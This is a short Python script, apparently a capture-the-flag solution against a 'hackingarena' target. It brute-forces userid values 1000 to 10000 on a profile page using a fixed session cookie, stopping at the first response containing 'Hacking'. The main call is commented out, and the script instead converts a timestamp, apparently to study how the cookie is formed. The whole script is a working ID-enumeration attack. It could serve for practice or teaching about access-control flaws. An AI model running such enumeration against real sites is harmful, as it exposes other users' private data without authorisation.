import requests

URL = "http://koala.hackingarena.no:802/profile.php"
COOKIES = {
    "CalypId": "AAABBBCCCDDD1731705252"
}
START_ID = 1000
END_ID = 10000

def main():
    total_ids = END_ID - START_ID + 1
    print(f"Starting user ID scan from {START_ID} to {END_ID}...\n")
    try:
        for idx, userid in enumerate(range(START_ID, END_ID + 1), start=1):
            params = {"userid": userid}
            response = requests.get(URL, params=params, cookies=COOKIES)
    
            if "Hacking" in response.text:
                print(f"\n[!] Match found for userid={userid}")
                print(f"    Response Text:\n{response.text}\n")
                print(f"response: {response.text}")
                break

            print(f"\rProcessed {idx}/{total_ids} user IDs", end="")

    except requests.RequestException as e:
        print(f"\n[!] Error during the request: {e}")
    print("\n\nScan completed.")

if __name__ == "__main__":
    #main()
    import datetime
    print(datetime.datetime.utcfromtimestamp(17315880990))
